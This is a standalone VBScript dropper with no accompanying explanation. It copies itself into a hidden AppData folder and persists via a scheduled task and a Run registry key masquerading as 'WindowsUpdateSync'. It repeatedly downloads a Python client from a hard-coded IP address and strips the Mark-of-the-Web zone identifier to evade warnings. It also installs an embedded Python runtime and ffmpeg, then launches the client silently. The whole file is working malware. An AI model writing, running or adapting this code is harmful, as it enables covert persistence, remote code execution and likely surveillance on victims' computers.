On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

host_url = "http://109.120.132.231:8080"
dir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\NinepeaksClient"
If Not fso.FolderExists(dir) Then fso.CreateFolder(dir)

my_path = WScript.ScriptFullName
target_vbs = dir & "\boot.vbs"

If LCase(my_path) <> LCase(target_vbs) Then
    fso.CopyFile my_path, target_vbs, True
End If

task_cmd = "schtasks /create /tn ""WindowsUpdateSync"" /tr ""wscript.exe \""" & target_vbs & "\"" //B //Nologo"" /sc onlogon /f"
sh.Run "cmd /c " & task_cmd, 0, True

reg_key = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateSync"
sh.RegWrite reg_key, "wscript.exe """ & target_vbs & """ //B //Nologo", "REG_SZ"


Function Download(url, target)
    On Error Resume Next
    temp_target = target & ".tmp"
    If fso.FileExists(temp_target) Then fso.DeleteFile(temp_target)
    sh.Run "cmd /c curl -L -k -s -o """ & temp_target & """ """ & url & """", 0, True
    If fso.FileExists(temp_target) Then
        If fso.GetFile(temp_target).Size > 100 Then
            sh.Run "cmd /c del /f /q """ & temp_target & ":Zone.Identifier""", 0, True
            If fso.FileExists(target) Then fso.DeleteFile(target)
            fso.MoveFile temp_target, target
            Download = True: Exit Function
        Else
            fso.DeleteFile(temp_target)
        End If
    End If
    Download = False
End Function

Do
    Randomize: rts = CStr(Fix(Timer * 1000))
    If Download(host_url & "/client.py?t=" & rts, dir & "\client.py") Then Exit Do
    WScript.Sleep 15000
Loop

py_dir = dir & "\python": py_exe = py_dir & "\pythonw.exe"
If Not fso.FileExists(py_exe) Then
    zip = dir & "\py.zip"
    If Download("https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip", zip) Then
        If Not fso.FolderExists(py_dir) Then fso.CreateFolder(py_dir)
        Set sa = CreateObject("Shell.Application")
        sa.NameSpace(py_dir).CopyHere sa.NameSpace(zip).Items(), 16
        WScript.Sleep 10000
        Set ts = fso.OpenTextFile(py_dir & "\python311._pth", 8, True)
        ts.WriteLine "import site": ts.Close
        fso.DeleteFile zip
    End If
End If

If Not fso.FileExists(dir & "\ffmpeg.exe") Then
    Download "https://github.com/eugeneware/ffmpeg-static/releases/download/b6.1.1/ffmpeg-win32-x64", dir & "\ffmpeg.exe"
End If

sh.Run """" & py_exe & """ """ & dir & "\client.py""", 0, False
